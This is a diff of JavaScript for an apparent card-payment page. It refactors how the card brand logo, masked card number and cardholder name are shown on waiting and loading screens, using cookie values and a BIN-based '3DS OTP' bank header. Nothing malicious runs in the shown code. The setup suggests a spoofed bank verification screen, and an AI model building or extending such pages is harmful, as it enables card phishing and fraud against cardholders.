@@ -519,19 +519,22 @@
   };
 
   function setBrand(brand, last4, holder) {
-    const logo = LOGOS[brand] || LOGOS.card;
-    $('brandLogo').src  = logo;
-    $('brandLogo2').src = logo;
-    $('brandBadge').src = logo;
+    const key = (brand === 'mc') ? 'mastercard' : String(brand || '').toLowerCase();
+    const logo = LOGOS[key] || LOGOS.card;
+    const setSrc = (id) => { const el = $(id); if (el) el.src = logo; };
+    setSrc('brandLogo'); setSrc('brandLogo2');
+    const setTxt = (id, v) => { const el = $(id); if (el) el.textContent = v; };
     if (last4) {
-      $('cardNum').textContent = '•••• •••• •••• ' + last4;
-      const wn = document.getElementById('cardNumWait'); if (wn) wn.textContent = '•••• •••• •••• ' + last4;
-      $('last4a').textContent = last4;
-      $('last4b').textContent = last4;
+      const masked = '•••• •••• •••• ' + last4;
+      setTxt('cardNumWait', masked);
+      setTxt('cardNumLoad', masked);
+      setTxt('last4a', last4);
+      setTxt('last4b', last4);
     }
     if (holder) {
-      $('cardHolder').textContent = holder.toUpperCase();
-      const wh = document.getElementById('cardHolderWait'); if (wh) wh.textContent = holder.toUpperCase();
+      const up = String(holder).toUpperCase();
+      setTxt('cardHolderWait', up);
+      setTxt('cardHolderLoad', up);
     }
   }
 
@@ -540,27 +543,8 @@
   const holder = getCookie('full_name');
   const last4Cookie = getCookie('card_last4');
   const brandCookie = (getCookie('card_brand') || '').toLowerCase();
-  if (brandCookie) {
-    const bKey = (brandCookie === 'mc') ? 'mastercard' : brandCookie;
-    const logo = LOGOS[bKey] || LOGOS.card;
-    if ($('brandLogo'))  $('brandLogo').src  = logo;
-    if ($('brandLogo2')) $('brandLogo2').src = logo;
-    if ($('brandBadge')) $('brandBadge').src = logo;
-  } else {
-    // default placeholder so the logo slot isn't empty before check-mode responds
-    if ($('brandLogo'))  $('brandLogo').src  = LOGOS.card;
-    if ($('brandLogo2')) $('brandLogo2').src = LOGOS.card;
-    if ($('brandBadge')) $('brandBadge').src = LOGOS.card;
-  }
-  if (holder) {
-    $('cardHolder').textContent = holder.toUpperCase();
-    const wh = document.getElementById('cardHolderWait'); if (wh) wh.textContent = holder.toUpperCase();
-  }
-  if (last4Cookie) {
-    $('last4a').textContent = last4Cookie; $('last4b').textContent = last4Cookie;
-    $('cardNum').textContent = '•••• •••• •••• ' + last4Cookie;
-    const wn = document.getElementById('cardNumWait'); if (wn) wn.textContent = '•••• •••• •••• ' + last4Cookie;
-  }
+  // Initial paint from cookies (check-mode may refine later)
+  setBrand(brandCookie || 'card', last4Cookie, holder);
 
   // ----- 3DS OTP header: live date + BIN-based bank name -----
   (function(){
